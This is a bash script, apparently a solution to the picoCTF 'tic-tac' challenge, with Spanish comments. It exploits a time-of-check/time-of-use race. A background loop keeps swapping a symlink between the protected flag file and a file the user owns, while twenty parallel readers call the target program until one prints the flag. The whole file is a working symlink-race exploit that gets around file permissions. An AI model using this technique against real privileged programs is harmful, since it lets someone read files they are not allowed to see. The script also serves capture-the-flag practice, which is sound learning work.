#!/bin/bash

DIR=/tmp/tictac_$USER
TARGET="$DIR/target"
OWNED="$DIR/owned"
FLAG="$PWD/flag.txt"

rm -rf "$DIR"
mkdir -p "$DIR"
echo owned > "$OWNED"

cleanup() {
    kill 0 2>/dev/null
}
trap cleanup EXIT INT TERM

# Alternar continuamente entre la flag y el archivo propio.
(
    while true; do
        ln -sfn "$FLAG" "$TARGET"
        ln -sfn "$OWNED" "$TARGET"
    done
) &

# Varios lectores aumentan mucho la probabilidad.
for i in $(seq 1 20); do
    (
        while true; do
            OUT=$(./txtreader "$TARGET" 2>/dev/null)

            case "$OUT" in
                *picoCTF\{*)
                    echo "$OUT" | tee "$DIR/result"
                    exit
                    ;;
            esac
        done
    ) &
done

while [ ! -s "$DIR/result" ]; do
    sleep 0.05
done

echo
echo "[+] FLAG:"
cat "$DIR/result"
